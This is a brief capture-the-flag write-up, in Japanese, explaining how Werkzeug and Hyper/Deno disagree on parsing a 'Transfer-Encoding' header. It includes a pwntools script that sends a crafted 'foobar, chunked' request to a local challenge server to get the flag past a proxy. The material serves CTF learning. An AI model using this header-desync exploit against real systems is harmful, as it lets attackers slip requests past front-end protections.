# proxy confusion revenge

## Description
I hope my flask server protect my flag this time!

## Writeup

Werkzeugは`Transfer-Encoding`ヘッダーが`"chunked"`と完全一致する場合のみ、`Transfer-Encoding: chunked`として扱い、それ以外は`Content-Length`を利用する(デフォルトの値は0)。
https://github.com/pallets/werkzeug/blob/5add63c955131fd73531d7369f16b2f1b4e342d4/src/werkzeug/sansio/utils.py#L140

その一方、Hyperは`Transfer-Encoding`ヘッダーがコンマ区切りで複数の値である場合も有効である(ただし、最後の値が`"chunked"`でなければならない)。これがRFCで正しい挙動である。
https://github.com/hyperium/hyper/blob/c68d42444ea6b930cb75907336150d2baf58a7e8/src/headers.rs#L130

これを利用して、bodyがDenoのみで有効であるようにリクエストを送ることができる。
```python
from pwn import *

io = remote("localhost", 4000)
io.send(b"""
POST /flag HTTP/1.1
Transfer-Encoding: foobar, chunked

15
please give me flag

0
        """.strip().replace(b"\n", b"\r\n") + b"\r\n\r\n")

r = io.recvall(timeout=1)
print(r.decode())
```